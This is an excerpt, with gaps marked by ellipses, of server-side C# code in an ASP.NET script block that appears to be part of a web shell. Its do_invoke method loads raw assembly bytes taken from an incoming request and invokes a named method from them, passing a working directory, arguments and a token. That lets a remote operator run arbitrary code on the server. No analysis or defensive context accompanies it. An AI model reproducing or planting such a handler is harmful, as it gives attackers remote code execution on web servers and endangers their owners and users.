...
<script type="test" language="C#" runat="Server"> 
    ...
    public class Handler
    {
        ...
        private string do_invoke(Dictionary<string, string> unpacked_request)
        {
            ...
            try
            {
                Assembly assembly = Assembly.Load(mod_content_bytes);
                
                Type assembly_type = assembly.GetType(mod_name);
                if (assembly_type == null)
                    return generate_response(ERR_CODE, "Type: '" + mod_name + "' not found in Assembly" + Environment.NewLine);
                
                MethodInfo assembly_method = assembly_type.GetMethod(MODULE_INVOKE_METHOD);
                if (assembly_method == null)
                    return generate_response(ERR_CODE, "Method: '" + MODULE_INVOKE_METHOD + "' not found in Assembly Type: '" + mod_name + "'" + Environment.NewLine);

                object assembly_instance = assembly.CreateInstance(mod_name);
                object mod_assembly_result = assembly_method.Invoke(assembly_instance, new object[] { mod_cwd, mod_raw_args, mod_token });
